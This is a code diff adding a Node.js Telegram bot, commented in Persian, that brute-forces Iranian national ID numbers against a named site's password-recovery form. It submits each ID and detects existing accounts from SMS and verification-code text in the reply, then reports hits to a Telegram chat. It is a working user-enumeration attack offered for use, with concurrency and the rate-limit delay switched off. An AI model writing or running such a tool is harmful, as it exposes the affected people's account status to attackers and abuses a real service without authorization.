@@ -1,0 +1,153 @@
+import dotenv from "dotenv";
+import TelegramBot from "node-telegram-bot-api";
+import { JSDOM } from "jsdom"; // ⚠️ در Node.js باید از jsdom استفاده کنی
+
+dotenv.config();
+
+const TOKEN = process.env.TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
+const START = Number(process.env.START);
+const END = Number(process.env.END);
+const CONCURRENT = Number(process.env.CONCURRENT) || 10; // تعداد درخواست همزمان
+
+const bot = new TelegramBot(TOKEN, { polling: true });
+
+// ===============================
+// تابع چک کردن کاربر
+// ===============================
+async function checkUserExists(nationalNo) {
+  const url = "https://haftometir.modabberonline.com/ForgetPassword.aspx";
+
+  try {
+    const pageRes = await fetch(url);
+    const pageHtml = await pageRes.text();
+
+    // استفاده از jsdom به جای DOMParser (برای Node.js)
+    const dom = new JSDOM(pageHtml);
+    const doc = dom.window.document;
+
+    const formData = new URLSearchParams();
+    doc.querySelectorAll('input[type="hidden"]').forEach((input) => {
+      formData.append(input.name, input.value || "");
+    });
+
+    formData.append("Radio1", "rbPersonal");
+    formData.append("txtNationalNo", nationalNo);
+    formData.append("ddlYears", "51");
+    formData.append("btnGetMobileNumber", "ارسال");
+
+    const response = await fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Connection: "keep-alive",
+      },
+      body: formData,
+    });
+
+    const resHtml = await response.text();
+
+    const exists =
+      resHtml.includes("کد تایید") ||
+      resHtml.includes("پیامک") ||
+      resHtml.includes("موبایل") ||
+      resHtml.includes("txtVerifyCode") ||
+      resHtml.includes("pnlVerifyCode");
+
+    return { nationalNo, exists };
+  } catch (err) {
+    return { nationalNo, exists: null, error: err.message };
+  }
+}
+
+// ===============================
+// تابع پردازش دسته‌ای (Batch)
+// ===============================
+async function processBatch(nationalNumbers) {
+  const promises = nationalNumbers.map((no) => checkUserExists(no));
+  return Promise.allSettled(promises);
+}
+
+// ===============================
+// تابع اصلی Brute Force با همزمانی
+// ===============================
+async function bruteForceAll(start, end, concurrent = 10) {
+  console.log(`⚡ Brute Force شروع شد (${concurrent} درخواست همزمان)`);
+  bot.sendMessage(
+    CHAT_ID,
+    `🚀 عملیات Brute Force شروع شد!\n⚡ همزمانی: ${concurrent}`
+  );
+
+  let count = 0;
+  let foundCount = 0;
+  const startTime = Date.now();
+
+  for (let i = start; i <= end; i += concurrent) {
+    // ساخت دسته‌ای از کدهای ملی
+    const batch = [];
+    for (let j = 0; j < concurrent && i + j <= end; j++) {
+      batch.push((i + j).toString().padStart(10, "0"));
+    }
+
+    // اجرای همزمان
+    const results = await processBatch(batch);
+
+    // پردازش نتایج
+    for (const result of results) {
+      if (result.status === "fulfilled") {
+        const { nationalNo, exists, error } = result.value;
+
+        if (exists) {
+          foundCount++;
+          const msg = `🎯 کاربر پیدا شد:\n<code>${nationalNo}</code>`;
+          console.log(msg);
+          bot.sendMessage(CHAT_ID, msg, { parse_mode: "HTML" });
+        }
+
+        if (error) {
+          console.log(`❌ خطا برای ${nationalNo}: ${error}`);
+        }
+      }
+      count++;
+    }
+
+    // گزارش هر 1000 تا
+    if (count % 1000 < concurrent) {
+      const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+      const speed = (count / elapsed).toFixed(1);
+      const status = `⏳ تست شده: ${count}\n🎯 پیدا شده: ${foundCount}\n⚡ سرعت: ${speed}/ثانیه\nآخرین: <code>${
+        batch[batch.length - 1]
+      }</code>`;
+      console.log(status);
+      bot.sendMessage(CHAT_ID, status, { parse_mode: "HTML" });
+    }
+
+    // تاخیر کوچک برای جلوگیری از بلاک شدن (اختیاری)
+    // await delay(100);
+  }
+
+  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
+  const finalMsg = `🔥 عملیات پایان یافت!\n✅ تست شده: ${count}\n🎯 پیدا شده: ${foundCount}\n⏱ زمان: ${totalTime} ثانیه`;
+  bot.sendMessage(CHAT_ID, finalMsg);
+  console.log(finalMsg);
+}
+
+// تابع تاخیر (اختیاری)
+const delay = (ms) => new Promise((r) => setTimeout(r, ms));
+
+// ===============================
+// دستور /start
+// ===============================
+bot.onText(/\/start/, () => {
+  bot.sendMessage(
+    CHAT_ID,
+    `⚡ ربات فعال شد!\n📊 محدوده: ${START} → ${END}\n🔄 همزمانی: ${CONCURRENT}`
+  );
+  bruteForceAll(START, END, CONCURRENT);
+});
+
+// دستور تنظیم همزمانی
+bot.onText(/\/concurrent (\d+)/, (msg, match) => {
+  const newConcurrent = parseInt(match[1]);
+  bot.sendMessage(CHAT_ID, `⚡ همزمانی تنظیم شد: ${newConcurrent}`);
+});
